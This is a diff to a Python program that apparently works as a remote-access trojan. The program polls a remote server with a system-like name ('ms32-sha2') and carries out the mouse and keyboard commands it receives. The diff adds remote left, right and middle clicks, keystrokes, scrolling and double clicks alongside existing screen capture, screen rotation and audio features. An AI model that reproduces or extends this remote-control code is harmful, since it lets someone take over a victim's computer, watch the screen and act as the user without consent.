@@ -10,11 +10,13 @@ from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from shutil import rmtree
 import rotatescreen as rs
 from PIL import Image
-from mouse import move, click
+from mouse import move, click, wheel, double_click
 from io import BytesIO
 import time 
 import httpx
 import asyncio
+import keyboard
+from pyautogui import size
 from mss import mss
 import pynput
 url = "https://ms32-sha2.onrender.com/"
@@ -23,6 +25,7 @@ terminate = False
 sstate = False
 sharing = False
 user = "03"
+width, height = size()
 try:
     pygame.mixer.init()
 except:
@@ -334,13 +337,27 @@ async def control():
             if data and data["type"] == "mouse":
 # {'height': 853, 'mouse': 0, 'type': 'mouse', 'width': 1517, 'x': 1516, 'y': 852}
                 print(data)
-                x = data["x"]*(1366/data["width"])
-                y = data["y"]*(768/data["height"])
-                import mouse
+                x = data["x"]*(width/data["width"])
+                y = data["y"]*(height/data["height"])            
                 move(x,y)
-                click()
-            if data and data["type"] == "key":
-                controller.press(ord(chr(data["btn"])))
+                if data["mouse"] == 0:
+                	click()
+                elif data["mouse"] == 1:
+                	click(button="right")
+                elif data["mouse"] == 2:
+                	click(button="middle")
+            elif data and data["type"] == "key":
+                #controller.press(chr(data["btn"]))
+                keyboard.send("+".join(chr(data["button"])))
+               
+            elif data and data["type"] == "scroll":
+                wheel(delta=data["deltaY"])
+                
+            elif data and data["type"] == "dbclick":
+                x = data["x"]*(width/data["width"])
+                y = data["y"]*(height/data["height"])            
+                move(x,y)
+                double_click()                           
                 
 def main():
     global sstate
